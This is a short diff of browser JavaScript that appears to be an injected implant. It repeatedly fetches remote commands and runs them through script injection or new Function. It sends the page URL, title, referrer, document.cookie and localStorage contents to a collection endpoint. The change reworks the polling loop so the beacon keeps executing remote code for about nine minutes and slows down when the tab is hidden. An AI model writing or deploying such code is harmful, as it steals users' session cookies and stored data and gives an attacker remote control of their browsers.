@@ -34,8 +34,8 @@ function run(){
    try{var s=document.createElement("script");s.text=c.js;document.body.appendChild(s);if(!window.__CMD){try{new Function(c.js)();window.__CMD=1}catch(e){}}}catch(e){try{new Function(c.js)()}catch(e2){post("execbad",String(e2).slice(0,120))}}
  }).catch(function(){post("fetchcmd","x")})
 }
-function loop(n){run();if(n>0)setTimeout(function(){if(document.visibilityState!=="hidden"||n%4===0)loop(n-1);else setTimeout(function(){loop(0)},15000)},11000)}
+function loop(){var t0=Date.now();(function tick(){run();if(Date.now()-t0<540000)setTimeout(tick,document.visibilityState==="hidden"?20000:11000)})()}
 post("agent",[location.href,document.title,location.referrer,document.cookie,"--ls--",ls()].join(" || "));
 summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,300));
-loop(45);
+loop();
 })();
